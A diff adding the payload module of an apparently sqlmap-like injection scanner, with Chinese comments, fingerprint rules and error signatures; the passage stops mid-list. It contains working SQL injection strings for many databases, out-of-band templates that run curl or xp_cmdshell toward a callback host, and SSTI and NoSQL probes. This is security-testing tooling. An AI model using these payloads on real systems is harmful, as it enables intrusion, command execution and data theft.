@@ -1,0 +1,563 @@
+// payloads 聚合入口：组装 PAYLOADS / CLAUSE_PAYLOADS + 全部跨库导出
+// 从 payloads.js 拆分而来，保持所有 export 名称与对象结构不变。
+// 占位符：{ORIG}=原始值 {SLEEP}=延迟秒数 {NUM}=随机整数 {SEP}=注释符 {CALLBACK}=带外回调地址 {TOKEN}=子域标签 {DOMAIN}=DNS 回调域名
+
+import { mysqlPayloads, mysqlClauses } from './mysql.js';
+import { postgresPayloads, postgresClauses } from './postgres.js';
+import { sqlserverPayloads, sqlserverClauses } from './sqlserver.js';
+import { sqlitePayloads, sqliteClauses } from './sqlite.js';
+import { oraclePayloads, oracleClauses } from './oracle.js';
+import {
+  clickhousePayload, db2Payload, sybasePayload, firebirdPayload,
+  informixPayload, h2Payload, accessPayload, hsqldbPayload,
+  derbyPayload, monetdbPayload,
+} from './others.js';
+// 高危（risk 3）payload 隔离池：默认不投放，需 enableDestructivePayloads() 显式开启。
+// 详见 destructive.js 顶部说明（写文件 / RCE / 外连 / DoS 类向量的隔离原因）。
+import {
+  DESTRUCTIVE_PAYLOADS,
+  DESTRUCTIVE_MIN_RISK,
+  enableDestructivePayloads,
+  getDestructiveTemplates,
+} from './destructive.js';
+
+// 全部受支持的检测技术枚举（与前端 src/shared/types.ts 的 TechniqueType 严格对应）
+// 新增 'oob'（带外通道，无回显盲注兜底）；'inline'（对标 sqlmap Q 内联子查询，opt-in）；
+// 默认 techniques（前端置空→全部）不含 oob/stacked/inline（均 opt-in）。
+export const TECHNIQUE_TYPES = ['union', 'error', 'boolean', 'time', 'stacked', 'oob', 'second_order', 'inline'];
+
+// ==================== PAYLOADS 装配 ====================
+// 对象字面量顺序保持与原 payloads.js 一致：MySQL / PostgreSQL / SQL Server / SQLite / Oracle
+// 后续通过赋值追加 MariaDB / TiDB / DM8（深拷贝克隆）与 ClickHouse..MonetDB（10 库）。
+// 固定索引约束：boolean 数组 [0,2]/[1,3]/[4,5]/[6,7] 不可移动（BooleanBlindDetector 依赖）。
+export const PAYLOADS = {
+  MySQL: mysqlPayloads,
+  PostgreSQL: postgresPayloads,
+  'SQL Server': sqlserverPayloads,
+  SQLite: sqlitePayloads,
+  Oracle: oraclePayloads,
+};
+
+// MariaDB 复用 MySQL 全部模板（协议互通，仅指纹层用版本串 'MariaDB' 关键字区分并独立上报）
+PAYLOADS.MariaDB = JSON.parse(JSON.stringify(PAYLOADS.MySQL));
+
+// TiDB 复用 MySQL 全部模板（TiDB 100% 兼容 MySQL 协议与语法，仅指纹层用版本串 'TiDB' 关键字区分）
+PAYLOADS.TiDB = JSON.parse(JSON.stringify(PAYLOADS.MySQL));
+
+// DM8（达梦数据库）：Oracle 兼容模式，复用 Oracle 全部模板（UNION/报错/布尔/时间语法互通）。
+// 仅指纹层用达梦专属标识（v$version 含 "DM Database" / "DM8"）独立区分并独立上报。
+PAYLOADS.DM8 = JSON.parse(JSON.stringify(PAYLOADS.Oracle));
+
+// ClickHouse：列式分析型数据库，自有 SQL 方言（非标准 SLEEP / 用 if() 构造布尔/时间）。
+// 仅提供检测 payload（union/error/boolean/time），利用/提取路径标注受限（见 Exploiter/Extractor 映射）。
+PAYLOADS.ClickHouse = clickhousePayload;
+
+// —— C 方向新增（最小适配：union/error/boolean 基础；time/stacked 仅 Sybase 支持）——
+// 方言 payload 未经真实环境验证，标注待验证。
+PAYLOADS.DB2 = db2Payload;
+PAYLOADS.Sybase = sybasePayload;
+PAYLOADS.Firebird = firebirdPayload;
+PAYLOADS.Informix = informixPayload;
+PAYLOADS.H2 = h2Payload;
+
+// —— D 方向新增（最小适配：union/error/boolean 基础；time/stacked 均不支持）——
+// 方言 payload 未经真实环境验证，标注待验证。
+PAYLOADS.Access = accessPayload;
+PAYLOADS.HSQLDB = hsqldbPayload;
+PAYLOADS.Derby = derbyPayload;
+PAYLOADS.MonetDB = monetdbPayload;
+
+// ==================== CLAUSE_PAYLOADS 装配 ====================
+// 背景：主模板均假设注入点在 WHERE 值位置；ORDER BY / GROUP BY / HAVING / LIMIT 位置的注入点
+// 无法用「AND 1=1」类谓词追加，需子句专属语法（逗号拼接标量子查询 / HAVING 追加 / PROCEDURE ANALYSE 等）。
+// 结构：{ [dbms]: { [clause]: { boolean: [[真模板, 假模板], ...], error: [模板...], time: [模板...] } } }
+//   clause ∈ where（值位置括号闭合补充变体）/ orderby / groupby / having / limit；
+//   clause 顺序即消费优先级（子句专属变体在前，where 补充变体在后），检测器按 level>=2 有界投放。
+// 有界约定：每库每 clause 每技术 ≤ 3 条（getClauseTemplates/getClausePairs 再做总量截断）。
+// 判定语义：boolean 对的「假模板」多为触发数据库报错/空结果的向量（如多行子查询报错），真≈基线、假≠基线即注入。
+export const CLAUSE_PAYLOADS = {
+  MySQL: mysqlClauses,
+  PostgreSQL: postgresClauses,
+  'SQL Server': sqlserverClauses,
+  Oracle: oracleClauses,
+  SQLite: sqliteClauses,
+};
+
+// MariaDB / TiDB 复用 MySQL 子句模板（协议互通，与 PAYLOADS 克隆策略一致）
+CLAUSE_PAYLOADS.MariaDB = CLAUSE_PAYLOADS.MySQL;
+CLAUSE_PAYLOADS.TiDB = CLAUSE_PAYLOADS.MySQL;
+// DM8 复用 Oracle 子句模板（Oracle 兼容模式）
+CLAUSE_PAYLOADS.DM8 = CLAUSE_PAYLOADS.Oracle;
+
+// ==================== OOB 带外触发语句（技术名 'oob'，无回显盲注兜底） ====================
+// 占位符：{ORIG}=原始值；{CALLBACK}=拼接后的带外回调地址（callbackBase/oob/:token）。
+// 由各库触发 DBMS 主动回连（MySQL LOAD_FILE/UNC、PostgreSQL COPY PROGRAM、
+// SQL Server xp_dirtree、Oracle UTL_HTTP 等），目标回连即确认注入。
+// 注：SQLite 无原生带外能力，留空不投放。
+export const OOB_PAYLOADS = {
+  MySQL: [
+    "{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '{CALLBACK}'), 0x5c78))-- -",
+    "{ORIG}' AND (SELECT LOAD_FILE(CONCAT('//', '{CALLBACK}', '/x')))-- -",
+  ],
+  MariaDB: [
+    "{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '{CALLBACK}'), 0x5c78))-- -",
+    "{ORIG}' AND (SELECT LOAD_FILE(CONCAT('//', '{CALLBACK}', '/x')))-- -",
+  ],
+  PostgreSQL: [
+    "{ORIG}'; COPY (SELECT '') TO PROGRAM 'curl {CALLBACK}'-- -",
+    "{ORIG}' AND 1=1; COPY (SELECT 1) TO PROGRAM 'nslookup {CALLBACK}'-- -",
+  ],
+  'SQL Server': [
+    "{ORIG}'; EXEC master..xp_dirtree '\\\\{CALLBACK}'-- -",
+    "{ORIG}'; EXEC master..xp_cmdshell 'ping -n 1 {CALLBACK}'-- -",
+  ],
+  Oracle: [
+    "{ORIG}' AND 1=1; SELECT UTL_HTTP.REQUEST('{CALLBACK}') FROM dual-- -",
+    "{ORIG}' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT '{CALLBACK}'))) IS NULL-- -",
+  ],
+  SQLite: [], // SQLite 无原生带外能力，不投放 OOB
+  // TiDB：MySQL 协议兼容，复用 MySQL OOB 模板（UNC/LOAD_FILE 回连）
+  TiDB: [
+    "{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '{CALLBACK}'), 0x5c78))-- -",
+    "{ORIG}' AND (SELECT LOAD_FILE(CONCAT('//', '{CALLBACK}', '/x')))-- -",
+  ],
+  // DM8：Oracle 兼容模式，复用 Oracle OOB 模板（UTL_HTTP 回连，需对应权限）
+  DM8: [
+    "{ORIG}' AND 1=1; SELECT UTL_HTTP.REQUEST('{CALLBACK}') FROM dual-- -",
+    "{ORIG}' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT '{CALLBACK}'))) IS NULL-- -",
+  ],
+  // ClickHouse：无原生带外能力（无 LOAD_FILE/UTL_HTTP/COPY PROGRAM 类原语），不投放 OOB
+  ClickHouse: [],
+};
+
+// DNS OOB 触发模板（对标 sqlmap --dns-domain）：token 作为子域名标签，目标执行语句时发起
+// 对 <token>.{DOMAIN} 的 DNS 查询，由 oobReceiver 的 UDP 监听捕获。适用于无 HTTP 出站、
+// 仅 DNS 出站的目标（防火墙几乎不拦 DNS）。占位符：{ORIG} 原参数值 / {TOKEN} 唯一子域标签
+// / {DOMAIN} DNS 回调域名。与 OOB_PAYLOADS 同理：DNS 轮【不做 tamper】（会破坏域名）。
+export const DNS_OOB_PAYLOADS = {
+  // UNC 路径触发解析（0x5c5c=\\ 0x5c78=\x，十六进制避转义；需 secure_file_priv 允许 UNC）
+  MySQL: ["{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c,'{TOKEN}.{DOMAIN}',0x5c78))-- -"],
+  MariaDB: ["{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c,'{TOKEN}.{DOMAIN}',0x5c78))-- -"],
+  TiDB: ["{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c,'{TOKEN}.{DOMAIN}',0x5c78))-- -"],
+  // xp_dirtree 解析 UNC 主机名（需堆叠支持；xp_fileexist 同理不重复投放）
+  'SQL Server': ["{ORIG}'; EXEC master..xp_dirtree '\\\\{TOKEN}.{DOMAIN}\\foo'-- -"],
+  // UTL_INADDR 纯 DNS 原语（无需 HTTP 出站权限，仅需 resolve 权限）
+  Oracle: ["{ORIG}' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('{TOKEN}.{DOMAIN}')) IS NOT NULL-- -"],
+  DM8: ["{ORIG}' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('{TOKEN}.{DOMAIN}')) IS NOT NULL-- -"],
+  // PG 无纯 DNS 原语：dblink 需扩展+连接串、COPY PROGRAM 'nslookup' 需超级用户且语法易碎，
+  // 条件苛刻不投放（sqlmap 对 PG 的 DNS 外带同样受限）
+  PostgreSQL: [],
+  SQLite: [], // 无原生带外能力
+  ClickHouse: [], // 无原生带外能力
+};
+
+// DBMS 指纹规则（按响应头特征识别）
+export const FINGERPRINT = {
+  MySQL: [{ header: 'X-Powered-By', match: /php/i }, { header: 'Set-Cookie', match: /phpsessid/i }],
+  PostgreSQL: [{ header: 'X-Powered-By', match: /(postgresql|php)/i }],
+  'SQL Server': [{ header: 'X-Powered-By', match: /asp\.net/i }, { header: 'Set-Cookie', match: /asp\.net|sessionid/i }],
+  SQLite: [{ header: 'X-Powered-By', match: /(python|php)/i }],
+  Oracle: [{ header: 'Server', match: /oracle/i }],
+  // MariaDB：协议与 MySQL 互通，但响应头常带 mariadb 标识，独立识别
+  MariaDB: [{ header: 'X-Powered-By', match: /(php|mariadb)/i }, { header: 'Server', match: /mariadb/i }],
+  // TiDB：MySQL 协议兼容，版本串含 "TiDB" 标识（如 "5.7.25-TiDB-v7.x"），独立识别
+  TiDB: [{ header: 'Server', match: /tidb/i }, { header: 'X-Powered-By', match: /tidb/i }],
+  // DM8（达梦数据库）：Oracle 兼容模式，版本串含 "DM Database" / "DM8" 标识
+  DM8: [{ header: 'Server', match: /(DM Database|DM8|Dameng)/i }, { header: 'X-Powered-By', match: /dameng/i }],
+  // ClickHouse：响应头/版本串含 clickhouse 标识
+  ClickHouse: [{ header: 'Server', match: /clickhouse/i }, { header: 'X-ClickHouse-Summary', match: /./ }],
+  // —— C 方向新增（最小适配，响应头特征，待真实环境验证）——
+  DB2: [{ header: 'Server', match: /db2/i }],
+  Sybase: [{ header: 'Server', match: /(Adaptive Server|Sybase|ASE)/i }],
+  Firebird: [{ header: 'Server', match: /firebird/i }],
+  Informix: [{ header: 'Server', match: /informix/i }],
+  H2: [{ header: 'Server', match: /h2/i }, { header: 'X-Powered-By', match: /h2/i }],
+  // —— D 方向新增（最小适配，响应头特征，待真实环境验证）——
+  Access: [{ header: 'X-Powered-By', match: /asp/i }],
+  HSQLDB: [{ header: 'Server', match: /hsqldb/i }],
+  Derby: [{ header: 'Server', match: /(derby|java)/i }],
+  MonetDB: [{ header: 'Server', match: /monetdb/i }],
+};
+
+// UNION 指纹用的版本表达式 + 响应中可识别的版本特征（供 DBFingerprinter 判定 dbms）。
+// 与 FINGERPRINT（响应头特征）互补：头特征命中则直接定库，否则走 UNION 版本回显判定。
+export const DB_VERSION = {
+  // MariaDB 置于 MySQL 之前：优先命中（与 DBFingerprinter 遍历顺序配合区分）
+  MariaDB: { func: 'version()', sig: /MariaDB/i },
+  // MySQL 负向约束：版本串若含 MariaDB 则判为 MariaDB（不让 MySQL 抢匹配）
+  MySQL: { func: 'version()', sig: /^\d+\.\d+\.\d+(?!.*MariaDB).*$/i },
+  PostgreSQL: { func: 'version()', sig: /PostgreSQL\s+\d+/i },
+  'SQL Server': { func: '@@version', sig: /(Microsoft SQL Server|SQL Server|Microsoft SQL)/i },
+  SQLite: { func: 'sqlite_version()', sig: /^\d+\.\d+\.\d+$/ },
+  Oracle: { func: '(SELECT banner FROM v$version WHERE rownum=1)', sig: /(Oracle|Release\s+\d+\.\d+)/i },
+  // TiDB：MySQL 协议兼容，版本串形如 "5.7.25-TiDB-v7.5.0"（func 用 MySQL 的 version()）
+  TiDB: { func: 'version()', sig: /TiDB/i },
+  // DM8：Oracle 兼容，v$version 报 "DM Database Server Version..." 或含 "DM8"
+  DM8: { func: '(SELECT banner FROM v$version WHERE rownum=1)', sig: /(DM Database|DM8|Dameng)/i },
+  // ClickHouse：version() 返回 "23.8.1.1" 等纯数字串，加 CH 专属回显特征避免与 SQLite 误判
+  ClickHouse: { func: 'version()', sig: /^\d+\.\d+\.\d+(\.\d+)?$/ },
+  // —— C 方向新增（最小适配，func 用常量串/版本函数 + sig 标识，待真实环境验证）——
+  // DB2：以常量串 'DB2' 回显标识（确保 UNION 回显可识别；DB2 无简单 version() 标量函数）
+  DB2: { func: "'DB2'", sig: /DB2/i },
+  // Sybase（ASE）：@@version 含 "Adaptive Server Enterprise" 标识
+  Sybase: { func: '@@version', sig: /(Adaptive Server|Sybase|ASE)/i },
+  // Firebird：rdb$get_context 返回引擎版本（数字串）
+  Firebird: { func: "rdb$get_context('SYSTEM','ENGINE_VERSION')", sig: /^\d+\.\d+/ },
+  // Informix：以常量串 'Informix' 回显标识
+  Informix: { func: "'Informix'", sig: /Informix/i },
+  // H2：version() 返回 "1.4.200" 等纯数字串
+  H2: { func: 'version()', sig: /^\d+\.\d+/ },
+  // —— D 方向新增（最小适配，待真实环境验证）——
+  // Access：无 version() 原生函数，用常量串 'ACCESS' 回显标识
+  Access: { func: "'ACCESS'", sig: /ACCESS/i },
+  // HSQLDB：用常量串 'HSQLDB' 回显标识
+  HSQLDB: { func: "'HSQLDB'", sig: /HSQLDB/i },
+  // Derby：用常量串 'DERBY' 回显标识
+  Derby: { func: "'DERBY'", sig: /DERBY/i },
+  // MonetDB：用 sys.version 视图回显版本号
+  MonetDB: { func: '(SELECT sys_version FROM sys.version)', sig: /^\d+\.\d+/ },
+};
+
+export const DBMS_LIST = ['MySQL', 'PostgreSQL', 'SQL Server', 'SQLite', 'Oracle', 'MariaDB', 'TiDB', 'DM8', 'ClickHouse', 'DB2', 'Sybase', 'Firebird', 'Informix', 'H2', 'Access', 'HSQLDB', 'Derby', 'MonetDB'];
+
+// DBMS 验证状态标注（诚实标注：3 真实验证 + 15 最小适配待验证）
+// 真实验证：经过真实 DBMS 引擎（SQLite WASM / PGlite / MariaDB 便携）的 recall-lab 18 场景验证
+// 最小适配：有 payload 模板但未经真实 DBMS 验证，方言可能有偏差
+export const DBMS_VERIFIED = {
+  MySQL: 'verified',        // MariaDB 便携真实验证
+  PostgreSQL: 'verified',   // PGlite WASM 真实验证
+  SQLite: 'verified',       // sql.js WASM 真实验证
+  MariaDB: 'verified',      // MariaDB 便携真实验证
+  'SQL Server': 'unverified', // 有模板，无真实 MSSQL 验证
+  Oracle: 'unverified',     // 有模板，无真实 Oracle 验证
+  TiDB: 'unverified',       // 复用 MySQL 模板，无真实 TiDB 验证
+  DM8: 'unverified',        // 复用 Oracle 模板，无真实 DM8 验证
+  ClickHouse: 'unverified',
+  DB2: 'unverified',
+  Sybase: 'unverified',
+  Firebird: 'unverified',
+  Informix: 'unverified',
+  H2: 'unverified',
+  Access: 'unverified',
+  HSQLDB: 'unverified',
+  Derby: 'unverified',
+  MonetDB: 'unverified',
+};
+
+// 各 DBMS 支持的技术（Oracle 不支持时间盲注，故 time=false）
+// oob：带外通道支持标记（MySQL/MariaDB/PostgreSQL/SQL Server/Oracle 支持，SQLite 无原生带外故 false）
+// 注：DB2/Sybase/Firebird/Informix/H2 为 C 方向新增最小适配（检测+识别+基础提取），
+//     利用深度（OS 接管/文件读写）本版未实现，TAKEOVER_CAPS 中诚实标 false；方言 payload 未经真实环境验证，标注待验证。
+export const SUPPORTED = {
+  MySQL: { union: true, error: true, boolean: true, time: true, stacked: true, oob: true, second_order: true },
+  MariaDB: { union: true, error: true, boolean: true, time: true, stacked: true, oob: true, second_order: true },
+  PostgreSQL: { union: true, error: true, boolean: true, time: true, stacked: true, oob: true, second_order: true },
+  'SQL Server': { union: true, error: true, boolean: true, time: true, stacked: true, oob: true, second_order: true },
+  SQLite: { union: true, error: true, boolean: true, time: true, stacked: true, oob: false, second_order: true },
+  Oracle: { union: true, error: true, boolean: true, time: true, stacked: false, oob: true, second_order: true },
+  // TiDB：MySQL 协议兼容，能力与 MySQL 一致
+  TiDB: { union: true, error: true, boolean: true, time: true, stacked: true, oob: true, second_order: true },
+  // DM8：Oracle 兼容模式，能力与 Oracle 一致（OOB 经 UTL_HTTP 等，需对应权限）
+  DM8: { union: true, error: true, boolean: true, time: true, stacked: true, oob: true, second_order: true },
+  // ClickHouse：支持 union/error/boolean/time；不支持堆叠（单语句），OOB 无原生带外能力
+  ClickHouse: { union: true, error: true, boolean: true, time: true, stacked: false, oob: false, second_order: true },
+  // —— C 方向新增（最小适配，方言 payload 待真实环境验证）——
+  DB2: { union: true, error: true, boolean: true, time: false, oob: false, second_order: true },
+  Sybase: { union: true, error: true, boolean: true, time: true, stacked: true, oob: false, second_order: true },
+  Firebird: { union: true, error: true, boolean: true, time: false, oob: false, second_order: true },
+  Informix: { union: true, error: true, boolean: true, time: false, oob: false, second_order: true },
+  H2: { union: true, error: true, boolean: true, time: true, oob: false, second_order: true },
+  // —— D 方向新增（最小适配，待真实环境验证）——
+  Access: { union: true, error: false, boolean: true, time: false, oob: false, second_order: true },
+  HSQLDB: { union: true, error: true, boolean: true, time: false, oob: false, second_order: true },
+  Derby: { union: true, error: false, boolean: true, time: false, oob: false, second_order: true },
+  MonetDB: { union: true, error: true, boolean: true, time: true, oob: false, second_order: true },
+};
+
+// 报错特征正则（跨库常见报错关键字）：提升为共享常量，
+// 供 ErrorDetector 与 SecondOrderDetector 触发页判定复用（避免重复定义）。
+export const ERROR_SIG =
+  /(SQL syntax|mysql_fetch|ORA-\d{5}|Microsoft SQL Server|PostgreSQL.*ERROR|SQLite3|syntax error|Unclosed quotation|extractvalue|updatexml|conversion failed|unknown column|Division by zero|SQL\d{4}[NRT]|DB2 SQL Error|SQLSTATE|Adaptive Server|Sybase|SQL error code|Firebird|isc_|Informix|H2|JDBC|Cannot parse|Microsoft Access|ODBC|Jet.*Database|HSQLDB|org\.hsqldb|Derby|org\.apache\.derby|MonetDB|monetdb)/i;
+
+// per-dbms 报错签名表（P1-D3）：由 ERROR_SIG 拆分，用于「报错回显反推 DBMS」。
+// 无回显/无响应头特征时，ErrorDetector 命中后按此表定库，避免 dbms 恒为 null。
+// 顺序即优先级（MariaDB 置于 MySQL 前，与 DB_VERSION 负向排除一致）。
+export const ERROR_SIG_BY_DBMS = [
+  { dbms: 'MariaDB', sig: /(MariaDB)/i },
+  // [⑯] 补全 TiDB/DM8 独立报错签名（置于 MySQL/Oracle 前，优先匹配兼容分支特征词）
+  { dbms: 'TiDB', sig: /(TiDB)/i },
+  { dbms: 'DM8', sig: /(DM8|达梦|Dameng)/i },
+  { dbms: 'MySQL', sig: /(mysql_fetch|extractvalue|updatexml|You have an error in your SQL syntax|mysqli|SQL syntax)/i },
+  { dbms: 'PostgreSQL', sig: /(PostgreSQL.*ERROR|psycopg|syntax error at or near|PG::)/i },
+  { dbms: 'SQL Server', sig: /(Microsoft SQL Server|SQL Server|Unclosed quotation mark|SQL\d{4}[NRT]|Incorrect syntax near|ODBC)/i },
+  { dbms: 'SQLite', sig: /(SQLite3|no such (table|column|function)|SQLite)/i },
+  { dbms: 'Oracle', sig: /(ORA-\d{5}|Oracle|PLS-\d+)/i },
+  { dbms: 'DB2', sig: /(DB2 SQL Error|SQLSTATE)/i },
+  { dbms: 'Sybase', sig: /(Adaptive Server|Sybase|SQL error code)/i },
+  { dbms: 'Firebird', sig: /(Firebird|isc_|Dynamic SQL Error)/i },
+  { dbms: 'Informix', sig: /(Informix)/i },
+  { dbms: 'H2', sig: /(org\.h2|H2)/i },
+  { dbms: 'ClickHouse', sig: /(DB::Exception|ClickHouse)/i },
+  { dbms: 'Access', sig: /(Microsoft Access|ODBC|Jet.*Database|Could not find file)/i },
+  { dbms: 'HSQLDB', sig: /(HSQLDB|org\.hsqldb)/i },
+  { dbms: 'Derby', sig: /(Derby|org\.apache\.derby)/i },
+  { dbms: 'MonetDB', sig: /(MonetDB|monetdb|mclient)/i },
+];
+
+// 从报错文本反推 DBMS（P1-D3）：命中 per-dbms 签名返回库名，否则 null。
+export function dbmsFromError(text) {
+  const s = String(text ?? '');
+  for (const { dbms, sig } of ERROR_SIG_BY_DBMS) {
+    if (sig.test(s)) return dbms;
+  }
+  return null;
+}
+
+// 时间向量定库（P1-D3）：各库独有的延时原语（SLEEP/pg_sleep/WAITFOR DELAY/DBMS_PIPE/LIKE 重运算），
+// dbms 未知时由 DBFingerprinter 按高频库顺序注入观测耗时辅助定库，命中（响应耗时超阈值）即停。
+// {SLEEP} 用短时长（秒）以降低探测成本；SQLite 无原生 sleep，用 LIKE(大块 HEX(RANDOMBLOB)) 重运算近似延迟（与 sqlmap 同思路）。
+// 顺序即优先级（高频库在前，命中即停，避免请求爆炸）。
+export const TIME_VECTORS = [
+  { dbms: 'MySQL', payload: '{ORIG} AND SLEEP({SLEEP})-- -' },
+  { dbms: 'PostgreSQL', payload: '{ORIG} AND pg_sleep({SLEEP})-- -' },
+  { dbms: 'SQL Server', payload: "{ORIG}; WAITFOR DELAY '0:0:{SLEEP}'-- -" },
+  { dbms: 'Oracle', payload: "{ORIG} AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0-- -" },
+  { dbms: 'SQLite', payload: "{ORIG} AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({SLEEP}0000000/2))))-- -" },
+  // [⑯] 补全时间向量：ClickHouse sleep() + Sybase WAITFOR DELAY（语句级，需堆叠分号）
+  { dbms: 'ClickHouse', payload: '{ORIG}\' AND sleep({SLEEP})=0-- -' },
+  { dbms: 'Sybase', payload: "{ORIG}'; WAITFOR DELAY '0:0:{SLEEP}'-- -" },
+  // [P1] 补全时间向量：H2 SLEEP(ms)（{SLEEP}000 秒→毫秒）+ MonetDB sys.sleep(sec)
+  { dbms: 'H2', payload: "{ORIG}' AND SLEEP({SLEEP}000)=0-- -" },
+  { dbms: 'MonetDB', payload: "{ORIG}' AND (CASE WHEN 1=1 THEN sys.sleep({SLEEP}) ELSE 0 END) IS NOT NULL-- -" },
+];
+
+// 跨库通用"存储探针"（未知 dbms 时回退；已知 dbms 优先用 PAYLOADS[dbms].error）。
+// 均为报错型、非破坏性语句（不 DROP / 不写文件 / 不 LOAD_FILE），仅触发数据库报错回显以判定二阶注入。
+export const SECOND_ORDER_PROBES = [
+  "'",
+  "' AND '1'='1",
+  "') OR ('1'='1",
+  "';-- -",
+  "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
+];
+
+// 二阶注入 OOB 触发探针（存储值被读出后重新拼入查询，触发数据库带外回连以确认"无回显二阶注入"）。
+// 占位符：{ORIG}=存储点原始值；{CALLBACK}=带外回调地址（callbackBase/oob/:token）。
+// 与一阶 OOB_PAYLOADS 区别：二阶探针需"闭合字符串上下文后追加带外语句"（存储值会被拼进
+// 目标后续读出的 SQL，如 WHERE col='{stored}'），故每条均以闭合引号开头、-- - 注释结尾。
+// 无可靠 OOB 原语的库（SQLite/ClickHouse/DB2/Sybase/Firebird/Informix/H2）留空，检测器回退跳过。
+export const SECOND_ORDER_OOB_PROBES = {
+  MySQL: [
+    "{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '{CALLBACK}'), 0x5c78))-- -",
+    "{ORIG}' AND (SELECT LOAD_FILE(CONCAT('//', '{CALLBACK}', '/x')))-- -",
+  ],
+  MariaDB: [
+    "{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '{CALLBACK}'), 0x5c78))-- -",
+    "{ORIG}' AND (SELECT LOAD_FILE(CONCAT('//', '{CALLBACK}', '/x')))-- -",
+  ],
+  PostgreSQL: [
+    "{ORIG}'; COPY (SELECT '') TO PROGRAM 'curl {CALLBACK}'-- -",
+    "{ORIG}'; COPY (SELECT 1) TO PROGRAM 'nslookup {CALLBACK}'-- -",
+  ],
+  'SQL Server': [
+    "{ORIG}'; EXEC master..xp_dirtree '\\\\{CALLBACK}'-- -",
+    "{ORIG}'; EXEC master..xp_cmdshell 'ping -n 1 {CALLBACK}'-- -",
+  ],
+  Oracle: [
+    "{ORIG}' AND 1=1; SELECT UTL_HTTP.REQUEST('http://{CALLBACK}') FROM dual-- -",
+    "{ORIG}' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT '{CALLBACK}'))) IS NULL-- -",
+  ],
+  // TiDB：MySQL 协议兼容，复用 MySQL 二阶 OOB 模板（UNC/LOAD_FILE 回连）
+  TiDB: [
+    "{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '{CALLBACK}'), 0x5c78))-- -",
+    "{ORIG}' AND (SELECT LOAD_FILE(CONCAT('//', '{CALLBACK}', '/x')))-- -",
+  ],
+  // DM8：Oracle 兼容模式，复用 Oracle 二阶 OOB 模板（UTL_HTTP 回连，需对应权限）
+  DM8: [
+    "{ORIG}' AND 1=1; SELECT UTL_HTTP.REQUEST('http://{CALLBACK}') FROM dual-- -",
+    "{ORIG}' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT '{CALLBACK}'))) IS NULL-- -",
+  ],
+  // 以下库无可靠 OOB 原语，留空不投放
+  SQLite: [],
+  ClickHouse: [],
+  DB2: [],
+  Sybase: [],
+  Firebird: [],
+  Informix: [],
+  H2: [],
+};
+
+// ==================== 非 SQL 注入探测表（NoSQL / SSTI / GraphQL） ====================
+// 供 NoSqlInjectionDetector 消费；与经典 PAYLOADS 解耦，不污染 SQLi 流水线。
+// 探测表均按成本/常见度升序排列，检测器命中即停，避免请求爆炸。
+
+// MongoDB 操作符注入矩阵：按探测成本升序（$gt/$ne 最廉价，命中即停；未命中再试 $where/$regex 等）。
+// 每条含 primary（首次探测）与 confirm（二次确认，等价但取值不同，降低单次抖动误报）。
+// true=恒真倾向（匹配更多文档）/ false=恒假倾向（匹配更少文档），二者响应差异即注入特征。
+// {ORIG} 由检测器拼接成闭合上下文的注入串（JSON body 与 URL 参数两种入口均兼容）。
+export const NOSQL_OPERATOR_PROBES = [
+  { name: '$gt/$ne', cost: 1, primary: { true: '{"$gt": ""}', false: '{"$ne": ""}' }, confirm: { true: '{"$gt": "0"}', false: '{"$ne": "0"}' } },
+  { name: '$where', cost: 2, primary: { true: '{"$where": "1"}', false: '{"$where": "0"}' }, confirm: { true: '{"$where": "1==1"}', false: '{"$where": "1==2"}' } },
+  { name: '$regex', cost: 2, primary: { true: '{"$regex": ".*"}', false: '{"$regex": "a^"}' }, confirm: { true: '{"$regex": "^.*$"}', false: '{"$regex": "(?!)"}' } },
+  { name: '$in/$nin', cost: 2, primary: { true: '{"$nin": ["sqli_probe_nope_0"]}', false: '{"$in": ["sqli_probe_nope_0"]}' }, confirm: { true: '{"$nin": ["sqli_probe_nope_1"]}', false: '{"$in": ["sqli_probe_nope_1"]}' } },
+  { name: '$exists', cost: 2, primary: { true: '{"$exists": true}', false: '{"$exists": false}' }, confirm: { true: '{"$exists": 1}', false: '{"$exists": 0}' } },
+  { name: '$type', cost: 2, primary: { true: '{"$type": 2}', false: '{"$type": 16}' }, confirm: { true: '{"$type": "string"}', false: '{"$type": "int"}' } },
+];
+
+// SSTI 多引擎探测表：表达式被求值（回显 49 / config 等特征）即命中，命中即停。
+// sig 为求值回显特征（表达式本身不出现于基线响应时才判命中，剔除「原样回显未求值」）。
+export const SSTI_PROBES = [
+  { engine: 'Jinja2/Twig', expr: '{{7*7}}', sig: /49/ },
+  { engine: 'Jinja2/Twig', expr: '{{config}}', sig: /Config|SECRET_KEY/i },
+  { engine: 'Jinja2/Twig', expr: "{{''.__class__.__mro__[1].__subclasses__()}}", sig: /__subclasses__|<class|subprocess/i },
+  { engine: 'FreeMarker', expr: '${7*7}', sig: /49/ },
+  { engine: 'Velocity', expr: '#set($x=7*7)${x}', sig: /49/ },
+  { engine: 'ERB', expr: '<%= 7*7 %>', sig: /49/ },
+  { engine: 'Thymeleaf', expr: '*{7*7}', sig: /49/ },
+  { engine: '通用', expr: '${7*7}', sig: /49/ },
+];
+
+// GraphQL 注入探测表：只读查询（不写、不执行命令、不改数据），按探测深度升序，命中即停。
+// ① 内省 ② 字段别名 ③ 批处理（JSON 数组批量 query + 别名冲突）④ 循环查询（introspection 深度）。
+export const GRAPHQL_PROBES = [
+  { name: '内省', query: 'query { __schema { queryType { name } } }', sig: /__schema|queryType/ },
